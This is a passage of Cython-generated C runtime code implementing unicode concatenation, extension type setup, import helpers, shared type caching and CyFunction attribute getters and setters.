    if (!PyUnicode_CheckExact(unicode))
        return 0;
    if (PyUnicode_CHECK_INTERNED(unicode))
        return 0;
    return 1;
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right
        #if CYTHON_REFNANNY
        , void* __pyx_refnanny
        #endif
    ) {
    PyObject *left = *p_left;
    Py_ssize_t left_len, right_len, new_len;
    if (unlikely(__Pyx_PyUnicode_READY(left) == -1))
        return NULL;
    if (unlikely(__Pyx_PyUnicode_READY(right) == -1))
        return NULL;
    left_len = PyUnicode_GET_LENGTH(left);
    if (left_len == 0) {
        Py_INCREF(right);
        return right;
    }
    right_len = PyUnicode_GET_LENGTH(right);
    if (right_len == 0) {
        Py_INCREF(left);
        return left;
    }
    if (unlikely(left_len > PY_SSIZE_T_MAX - right_len)) {
        PyErr_SetString(PyExc_OverflowError,
                        "strings are too large to concat");
        return NULL;
    }
    new_len = left_len + right_len;
    if (__Pyx_unicode_modifiable(left)
            && PyUnicode_CheckExact(right)
            && PyUnicode_KIND(right) <= PyUnicode_KIND(left)
            && !(PyUnicode_IS_ASCII(left) && !PyUnicode_IS_ASCII(right))) {
        __Pyx_GIVEREF(*p_left);
        if (unlikely(PyUnicode_Resize(p_left, new_len) != 0)) {
            __Pyx_GOTREF(*p_left);
            return NULL;
        }
        __Pyx_INCREF(*p_left);
        _PyUnicode_FastCopyCharacters(*p_left, left_len, right, 0, right_len);
        return *p_left;
    } else {
        return __Pyx_PyUnicode_Concat(left, right);
    }
  }
#endif

/* FixUpExtensionType */
#if CYTHON_USE_TYPE_SPECS
static int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type) {
#if PY_VERSION_HEX > 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
    CYTHON_UNUSED_VAR(spec);
    CYTHON_UNUSED_VAR(type);
#else
    const PyType_Slot *slot = spec->slots;
    while (slot && slot->slot && slot->slot != Py_tp_members)
        slot++;
    if (slot && slot->slot == Py_tp_members) {
        int changed = 0;
#if !(PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON)
        const
#endif
            PyMemberDef *memb = (PyMemberDef*) slot->pfunc;
        while (memb && memb->name) {
            if (memb->name[0] == '_' && memb->name[1] == '_') {
#if PY_VERSION_HEX < 0x030900b1
                if (strcmp(memb->name, "__weaklistoffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
                    type->tp_weaklistoffset = memb->offset;
                    changed = 1;
                }
                else if (strcmp(memb->name, "__dictoffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
                    type->tp_dictoffset = memb->offset;
                    changed = 1;
                }
#if CYTHON_METH_FASTCALL
                else if (strcmp(memb->name, "__vectorcalloffset__") == 0) {
                    assert(memb->type == T_PYSSIZET);
                    assert(memb->flags == READONLY);
#if PY_VERSION_HEX >= 0x030800b4
                    type->tp_vectorcall_offset = memb->offset;
#else
                    type->tp_print = (printfunc) memb->offset;
#endif
                    changed = 1;
                }
#endif
#else
                if ((0));
#endif
#if PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON
                else if (strcmp(memb->name, "__module__") == 0) {
                    PyObject *descr;
                    assert(memb->type == T_OBJECT);
                    assert(memb->flags == 0 || memb->flags == READONLY);
                    descr = PyDescr_NewMember(type, memb);
                    if (unlikely(!descr))
                        return -1;
                    if (unlikely(PyDict_SetItem(type->tp_dict, PyDescr_NAME(descr), descr) < 0)) {
                        Py_DECREF(descr);
                        return -1;
                    }
                    Py_DECREF(descr);
                    changed = 1;
                }
#endif
            }
            memb++;
        }
        if (changed)
            PyType_Modified(type);
    }
#endif
    return 0;
}
#endif

/* PyObjectCallMethod0 */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name) {
    PyObject *method = NULL, *result = NULL;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_CallOneArg(method, obj);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) goto bad;
    result = __Pyx_PyObject_CallNoArg(method);
    Py_DECREF(method);
bad:
    return result;
}

/* ValidateBasesTuple */
#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS
static int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases) {
    Py_ssize_t i, n = PyTuple_GET_SIZE(bases);
    for (i = 1; i < n; i++)
    {
        PyObject *b0 = PyTuple_GET_ITEM(bases, i);
        PyTypeObject *b;
#if PY_MAJOR_VERSION < 3
        if (PyClass_Check(b0))
        {
            PyErr_Format(PyExc_TypeError, "base class '%.200s' is an old-style class",
                         PyString_AS_STRING(((PyClassObject*)b0)->cl_name));
            return -1;
        }
#endif
        b = (PyTypeObject*) b0;
        if (!__Pyx_PyType_HasFeature(b, Py_TPFLAGS_HEAPTYPE))
        {
            __Pyx_TypeName b_name = __Pyx_PyType_GetName(b);
            PyErr_Format(PyExc_TypeError,
                "base class '" __Pyx_FMT_TYPENAME "' is not a heap type", b_name);
            __Pyx_DECREF_TypeName(b_name);
            return -1;
        }
        if (dictoffset == 0 && b->tp_dictoffset)
        {
            __Pyx_TypeName b_name = __Pyx_PyType_GetName(b);
            PyErr_Format(PyExc_TypeError,
                "extension type '%.200s' has no __dict__ slot, "
                "but base type '" __Pyx_FMT_TYPENAME "' has: "
                "either add 'cdef dict __dict__' to the extension type "
                "or add '__slots__ = [...]' to the base type",
                type_name, b_name);
            __Pyx_DECREF_TypeName(b_name);
            return -1;
        }
    }
    return 0;
}
#endif

/* PyType_Ready */
static int __Pyx_PyType_Ready(PyTypeObject *t) {
#if CYTHON_USE_TYPE_SPECS || !(CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API) || defined(PYSTON_MAJOR_VERSION)
    (void)__Pyx_PyObject_CallMethod0;
#if CYTHON_USE_TYPE_SPECS
    (void)__Pyx_validate_bases_tuple;
#endif
    return PyType_Ready(t);
#else
    int r;
    PyObject *bases = __Pyx_PyType_GetSlot(t, tp_bases, PyObject*);
    if (bases && unlikely(__Pyx_validate_bases_tuple(t->tp_name, t->tp_dictoffset, bases) == -1))
        return -1;
#if PY_VERSION_HEX >= 0x03050000 && !defined(PYSTON_MAJOR_VERSION)
    {
        int gc_was_enabled;
    #if PY_VERSION_HEX >= 0x030A00b1
        gc_was_enabled = PyGC_Disable();
        (void)__Pyx_PyObject_CallMethod0;
    #else
        PyObject *ret, *py_status;
        PyObject *gc = NULL;
        #if PY_VERSION_HEX >= 0x030700a1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM+0 >= 0x07030400)
        gc = PyImport_GetModule(__pyx_kp_u_gc);
        #endif
        if (unlikely(!gc)) gc = PyImport_Import(__pyx_kp_u_gc);
        if (unlikely(!gc)) return -1;
        py_status = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_isenabled);
        if (unlikely(!py_status)) {
            Py_DECREF(gc);
            return -1;
        }
        gc_was_enabled = __Pyx_PyObject_IsTrue(py_status);
        Py_DECREF(py_status);
        if (gc_was_enabled > 0) {
            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_disable);
            if (unlikely(!ret)) {
                Py_DECREF(gc);
                return -1;
            }
            Py_DECREF(ret);
        } else if (unlikely(gc_was_enabled == -1)) {
            Py_DECREF(gc);
            return -1;
        }
    #endif
        t->tp_flags |= Py_TPFLAGS_HEAPTYPE;
#if PY_VERSION_HEX >= 0x030A0000
        t->tp_flags |= Py_TPFLAGS_IMMUTABLETYPE;
#endif
#else
        (void)__Pyx_PyObject_CallMethod0;
#endif
    r = PyType_Ready(t);
#if PY_VERSION_HEX >= 0x03050000 && !defined(PYSTON_MAJOR_VERSION)
        t->tp_flags &= ~Py_TPFLAGS_HEAPTYPE;
    #if PY_VERSION_HEX >= 0x030A00b1
        if (gc_was_enabled)
            PyGC_Enable();
    #else
        if (gc_was_enabled) {
            PyObject *tp, *v, *tb;
            PyErr_Fetch(&tp, &v, &tb);
            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_enable);
            if (likely(ret || r == -1)) {
                Py_XDECREF(ret);
                PyErr_Restore(tp, v, tb);
            } else {
                Py_XDECREF(tp);
                Py_XDECREF(v);
                Py_XDECREF(tb);
                r = -1;
            }
        }
        Py_DECREF(gc);
    #endif
    }
#endif
    return r;
#endif
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    __Pyx_TypeName type_name = __Pyx_PyType_GetName(tp);
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%U'",
                 type_name, attr_name);
#else
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%.400s'",
                 type_name, PyString_AS_STRING(attr_name));
#endif
    __Pyx_DECREF_TypeName(type_name);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        const char* module_name_str = 0;
        PyObject* module_name = 0;
        PyObject* module_dot = 0;
        PyObject* full_name = 0;
        PyErr_Clear();
        module_name_str = PyModule_GetName(module);
        if (unlikely(!module_name_str)) { goto modbad; }
        module_name = PyUnicode_FromString(module_name_str);
        if (unlikely(!module_name)) { goto modbad; }
        module_dot = PyUnicode_Concat(module_name, __pyx_kp_u__72);
        if (unlikely(!module_dot)) { goto modbad; }
        full_name = PyUnicode_Concat(module_dot, name);
        if (unlikely(!full_name)) { goto modbad; }
        #if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)
        {
            PyObject *modules = PyImport_GetModuleDict();
            if (unlikely(!modules))
                goto modbad;
            value = PyObject_GetItem(modules, full_name);
        }
        #else
        value = PyImport_GetModule(full_name);
        #endif
      modbad:
        Py_XDECREF(full_name);
        Py_XDECREF(module_dot);
        Py_XDECREF(module_name);
    }
    if (unlikely(!value)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* FetchSharedCythonModule */
static PyObject *__Pyx_FetchSharedCythonABIModule(void) {
    PyObject *abi_module = PyImport_AddModule((char*) __PYX_ABI_MODULE_NAME);
    if (unlikely(!abi_module)) return NULL;
    Py_INCREF(abi_module);
    return abi_module;
}

/* FetchCommonType */
static int __Pyx_VerifyCachedType(PyObject *cached_type,
                               const char *name,
                               Py_ssize_t basicsize,
                               Py_ssize_t expected_basicsize) {
    if (!PyType_Check(cached_type)) {
        PyErr_Format(PyExc_TypeError,
            "Shared Cython type %.200s is not a type object", name);
        return -1;
    }
    if (basicsize != expected_basicsize) {
        PyErr_Format(PyExc_TypeError,
            "Shared Cython type %.200s has the wrong size, try recompiling",
            name);
        return -1;
    }
    return 0;
}
#if !CYTHON_USE_TYPE_SPECS
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* abi_module;
    const char* object_name;
    PyTypeObject *cached_type = NULL;
    abi_module = __Pyx_FetchSharedCythonABIModule();
    if (!abi_module) return NULL;
    object_name = strrchr(type->tp_name, '.');
    object_name = object_name ? object_name+1 : type->tp_name;
    cached_type = (PyTypeObject*) PyObject_GetAttrString(abi_module, object_name);
    if (cached_type) {
        if (__Pyx_VerifyCachedType(
              (PyObject *)cached_type,
              object_name,
              cached_type->tp_basicsize,
              type->tp_basicsize) < 0) {
            goto bad;
        }
        goto done;
    }
    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
    PyErr_Clear();
    if (PyType_Ready(type) < 0) goto bad;
    if (PyObject_SetAttrString(abi_module, object_name, (PyObject *)type) < 0)
        goto bad;
    Py_INCREF(type);
    cached_type = type;
done:
    Py_DECREF(abi_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}
#else
static PyTypeObject *__Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases) {
    PyObject *abi_module, *cached_type = NULL;
    const char* object_name = strrchr(spec->name, '.');
    object_name = object_name ? object_name+1 : spec->name;
    abi_module = __Pyx_FetchSharedCythonABIModule();
    if (!abi_module) return NULL;
    cached_type = PyObject_GetAttrString(abi_module, object_name);
    if (cached_type) {
        Py_ssize_t basicsize;
#if CYTHON_COMPILING_IN_LIMITED_API
        PyObject *py_basicsize;
        py_basicsize = PyObject_GetAttrString(cached_type, "__basicsize__");
        if (unlikely(!py_basicsize)) goto bad;
        basicsize = PyLong_AsSsize_t(py_basicsize);
        Py_DECREF(py_basicsize);
        py_basicsize = 0;
        if (unlikely(basicsize == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
#else
        basicsize = likely(PyType_Check(cached_type)) ? ((PyTypeObject*) cached_type)->tp_basicsize : -1;
#endif
        if (__Pyx_VerifyCachedType(
              cached_type,
              object_name,
              basicsize,
              spec->basicsize) < 0) {
            goto bad;
        }
        goto done;
    }
    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
    PyErr_Clear();
    CYTHON_UNUSED_VAR(module);
    cached_type = __Pyx_PyType_FromModuleAndSpec(abi_module, spec, bases);
    if (unlikely(!cached_type)) goto bad;
    if (unlikely(__Pyx_fix_up_extension_type_from_spec(spec, (PyTypeObject *) cached_type) < 0)) goto bad;
    if (PyObject_SetAttrString(abi_module, object_name, cached_type) < 0) goto bad;
done:
    Py_DECREF(abi_module);
    assert(cached_type == NULL || PyType_Check(cached_type));
    return (PyTypeObject *) cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}
#endif

/* PyVectorcallFastCallDict */
#if CYTHON_METH_FASTCALL
static PyObject *__Pyx_PyVectorcall_FastCallDict_kw(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)
{
    PyObject *res = NULL;
    PyObject *kwnames;
    PyObject **newargs;
    PyObject **kwvalues;
    Py_ssize_t i, pos;
    size_t j;
    PyObject *key, *value;
    unsigned long keys_are_strings;
    Py_ssize_t nkw = PyDict_GET_SIZE(kw);
    newargs = (PyObject **)PyMem_Malloc((nargs + (size_t)nkw) * sizeof(args[0]));
    if (unlikely(newargs == NULL)) {
        PyErr_NoMemory();
        return NULL;
    }
    for (j = 0; j < nargs; j++) newargs[j] = args[j];
    kwnames = PyTuple_New(nkw);
    if (unlikely(kwnames == NULL)) {
        PyMem_Free(newargs);
        return NULL;
    }
    kwvalues = newargs + nargs;
    pos = i = 0;
    keys_are_strings = Py_TPFLAGS_UNICODE_SUBCLASS;
    while (PyDict_Next(kw, &pos, &key, &value)) {
        keys_are_strings &= Py_TYPE(key)->tp_flags;
        Py_INCREF(key);
        Py_INCREF(value);
        PyTuple_SET_ITEM(kwnames, i, key);
        kwvalues[i] = value;
        i++;
    }
    if (unlikely(!keys_are_strings)) {
        PyErr_SetString(PyExc_TypeError, "keywords must be strings");
        goto cleanup;
    }
    res = vc(func, newargs, nargs, kwnames);
cleanup:
    Py_DECREF(kwnames);
    for (i = 0; i < nkw; i++)
        Py_DECREF(kwvalues[i]);
    PyMem_Free(newargs);
    return res;
}
static CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)
{
    if (likely(kw == NULL) || PyDict_GET_SIZE(kw) == 0) {
        return vc(func, args, nargs, NULL);
    }
    return __Pyx_PyVectorcall_FastCallDict_kw(func, vc, args, nargs, kw);
}
#endif

/* CythonFunctionShared */
static CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj) {
#if PY_VERSION_HEX < 0x030900B1
    __Pyx_Py_XDECREF_SET(
        __Pyx_CyFunction_GetClassObj(f),
            ((classobj) ? __Pyx_NewRef(classobj) : NULL));
#else
    __Pyx_Py_XDECREF_SET(
        ((PyCMethodObject *) (f))->mm_class,
        (PyTypeObject*)((classobj) ? __Pyx_NewRef(classobj) : NULL));
#endif
}
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, void *closure)
{
    CYTHON_UNUSED_VAR(closure);
    if (unlikely(op->func_doc == NULL)) {
        if (((PyCFunctionObject*)op)->m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_doc, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_name, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_qualname, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_dict, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(op);
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value) {
        value = Py_None;
    } else if (unlikely(value != Py_None && !PyTuple_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__defaults__ will not "
                 "currently affect the values used in function calls", 1);
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->defaults_tuple, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->defaults_tuple;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value) {
        value = Py_None;
    } else if (unlikely(value != Py_None && !PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__kwdefaults__ will not "
                 "currently affect the values used in function calls", 1);
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->defaults_kwdict, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->defaults_kwdict;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value || value == Py_None) {
        value = NULL;
    } else if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_annotations, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->func_annotations;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyObject *
__Pyx_CyFunction_get_is_coroutine(__pyx_CyFunctionObject *op, void *context) {
    int is_coroutine;
    CYTHON_UNUSED_VAR(context);
    if (op->func_is_coroutine) {
        return __Pyx_NewRef(op->func_is_coroutine);
    }
    is_coroutine = op->flags & __Pyx_CYFUNCTION_COROUTINE;
#if PY_VERSION_HEX >= 0x03050000
    if (is_coroutine) {
        PyObject *module, *fromlist, *marker = __pyx_n_s_is_coroutine;
        fromlist = PyList_New(1);
        if (unlikely(!fromlist)) return NULL;
        Py_INCREF(marker);
        PyList_SET_ITEM(fromlist, 0, marker);
        module = PyImport_ImportModuleLevelObject(__pyx_n_s_asyncio_coroutines, NULL, NULL, fromlist, 0);
        Py_DECREF(fromlist);
        if (unlikely(!module)) goto ignore;
        op->func_is_coroutine = __Pyx_PyObject_GetAttrStr(module, marker);
        Py_DECREF(module);
        if (likely(op->func_is_coroutine)) {
            return __Pyx_NewRef(op->func_is_coroutine);
        }
ignore:
        PyErr_Clear();
    }
#endif
    op->func_is_coroutine = __Pyx_PyBool_FromLong(is_coroutine);
    return __Pyx_NewRef(op->func_is_coroutine);
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {(char *) "_is_coroutine", (getter)__Pyx_CyFunction_get_is_coroutine, 0, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), 0, 0},
#if CYTHON_USE_TYPE_SPECS
    {(char *) "__dictoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_dict), READONLY, 0},
#if CYTHON_METH_FASTCALL
#if CYTHON_BACKPORT_VECTORCALL
    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_vectorcall), READONLY, 0},
#else
    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(PyCFunctionObject, vectorcall), READONLY, 0},
#endif
#endif
#if PY_VERSION_HEX < 0x030500A0
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_weakreflist), READONLY, 0},
#else
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(PyCFunctionObject, m_weakreflist), READONLY, 0},
#endif
#endif
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, PyObject *args)
{
    CYTHON_UNUSED_VAR(args);
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(((PyCFunctionObject*)m)->m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
